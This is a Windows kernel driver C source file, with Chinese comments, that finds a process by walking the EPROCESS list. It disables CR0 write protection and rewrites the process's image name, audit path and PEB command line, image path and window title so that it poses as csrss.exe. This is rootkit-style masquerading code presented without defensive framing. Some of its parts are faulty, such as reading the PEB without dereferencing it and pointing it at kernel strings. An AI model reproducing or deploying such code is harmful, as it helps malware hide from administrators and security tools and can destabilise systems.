#include"function.h"
__int64 EprocessOffset = 0x188;
__int64 PebOffset = 0x338;
typedef int WORD;
typedef struct _SE_AUDIT_PROCESS_CREATION_INFO
{
	POBJECT_NAME_INFORMATION ImageFileName;
} SE_AUDIT_PROCESS_CREATION_INFO, * PSE_AUDIT_PROCESS_CREATION_INFO;
typedef struct _CURDIR
{
	UNICODE_STRING DosPath;
	PVOID Handle;
} CURDIR, * PCURDIR;
typedef struct _RTL_DRIVE_LETTER_CURDIR
{
	WORD Flags;
	WORD Length;
	ULONG TimeStamp;
	STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;
typedef struct _RTL_USER_PROCESS_PARAMETERS
{
	ULONG MaximumLength;
	ULONG Length;
	ULONG Flags;
	ULONG DebugFlags;
	PVOID ConsoleHandle;
	ULONG ConsoleFlags;
	PVOID StandardInput;
	PVOID StandardOutput;
	PVOID StandardError;
	CURDIR CurrentDirectory;
	UNICODE_STRING DllPath;
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
	PVOID Environment;
	ULONG StartingX;
	ULONG StartingY;
	ULONG CountX;
	ULONG CountY;
	ULONG CountCharsX;
	ULONG CountCharsY;
	ULONG FillAttribute;
	ULONG WindowFlags;
	ULONG ShowWindowFlags;
	UNICODE_STRING WindowTitle;
	UNICODE_STRING DesktopInfo;
	UNICODE_STRING ShellInfo;
	UNICODE_STRING RuntimeData;
	RTL_DRIVE_LETTER_CURDIR CurrentDirectores[32];
	ULONG EnvironmentSize;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;
typedef struct _PEB_LDR_DATA
{
	ULONG Length;
	UCHAR Initialized;
	PVOID SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID EntryInProgress;
} PEB_LDR_DATA, * PPEB_LDR_DATA;


PEPROCESS EnumProcess(PUCHAR* pString)
{
	PEPROCESS pProcess =  PsGetCurrentProcess();
	INT ProcessIdFirst = (INT)PsGetProcessId(pProcess);
	PUCHAR pFileName = PsGetProcessImageFileName(pProcess);
	//DbgPrint("ProcessID:%d    FileName:%s", ProcessIdFirst, pFileName);
	do
	{
		PLIST_ENTRY64 pList = (PLIST_ENTRY64)((ULONG64)pProcess + EprocessOffset);
		pProcess = (PEPROCESS)((ULONG64)(pList->Flink) - EprocessOffset);
		INT ProcessIdSecond = (INT)PsGetProcessId(pProcess);
		pFileName = PsGetProcessImageFileName(pProcess);
		//DbgPrint("ProcessID:%d    FileName:%s", ProcessIdSecond, pFileName);
		INT result = strcmp(pString, pFileName);
		if (!result)
		{
			return pProcess;
		}
		if (ProcessIdSecond == ProcessIdFirst) //没找到
		{
			return -1;
		}
	} while (1);
}
KIRQL WPOFFx64()
{
	KIRQL irql = KeRaiseIrqlToDpcLevel();
	UINT64 cr0 = __readcr0();
	cr0 &= 0xfffffffffffeffff;
	__writecr0(cr0);
	_disable();
	return irql;
}
void WPONx64(KIRQL irql)
{
	UINT64 cr0 = __readcr0();
	cr0 |= 0x10000;
	_enable();
	__writecr0(cr0);
	KeLowerIrql(irql);
}
void ChangeProcessName(PEPROCESS pProcess)
{
	KIRQL irql = WPOFFx64();

	//ImageFileName 
	PUCHAR pName1 = (PUCHAR)((ULONG64)pProcess + 0x2e0);
	UCHAR* str1 = "csrss.exe";
	RtlCopyMemory(pName1, str1, 14); 

	//SE_AUDIT_PROCESS_CREATION_INFO
	//UNICODE_STRING Name = { 0 };
	//Name.Length = 0x7e;
	//Name.MaximumLength = 0x80;
	//Name.Buffer = L"\\Device\\HarddiskVolume1\\Windows\\System32\\Application\\csrss.exe";
	//WCHAR* p = L"\\Device\\HarddiskVolume1\\Windows\\System32\\Application\\csrss.exe";
	//SE_AUDIT_PROCESS_CREATION_INFO info1;
	//OBJECT_NAME_INFORMATION info2;
	//(&info2)->Name = Name;
	//info1.ImageFileName = &info2;
	PUNICODE_STRING* pName2 = (PUNICODE_STRING*)((ULONG64)pProcess + 0x390);
	//*pName2 = &Name;
	PWCHAR pBuffer = (PWCHAR)((ULONG64)(*pName2) + 8);
	//原buffer128个字节
	WCHAR* buffer = L"\\Device\\HarddiskVolume1\\Windows\\System32\\csrss.exe\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
	RtlCopyMemory(pBuffer, buffer, 178);

	//PEB-->ProcessParameters-->ImagePathName
	//PEB-->ProcessParameters-->CommandLine
	//PEB->ProcessParameters-->WindowTitle
	
	PPEB pPeb = (PPEB)((ULONG64)pProcess + PebOffset);
	PRTL_USER_PROCESS_PARAMETERS pProcessParameters = (PRTL_USER_PROCESS_PARAMETERS)((ULONG64)pPeb + 0x20);
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
	UNICODE_STRING WindowTitle;
	RtlInitUnicodeString(&ImagePathName, L"csrss.exe");
	RtlInitUnicodeString(&CommandLine, L"csrss.exe");
	RtlInitUnicodeString(&WindowTitle, L"csrss.exe");
	pProcessParameters->CommandLine = CommandLine;
	pProcessParameters->ImagePathName = ImagePathName;
	pProcessParameters->WindowTitle = WindowTitle;

	//PEB-->LDR-->InLoadOrderModuleList->第一个结构->FullDllName
	//PEB-->LDR-->InLoadOrderModuleList->第一个结构->BaseDllName
	//PEB-->LDR-->InMemoryOrderModuleList->第一个结构->FullDllName
	//PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)((ULONG64)pPeb + 0x18);

	


	
	WPONx64(irql);
}
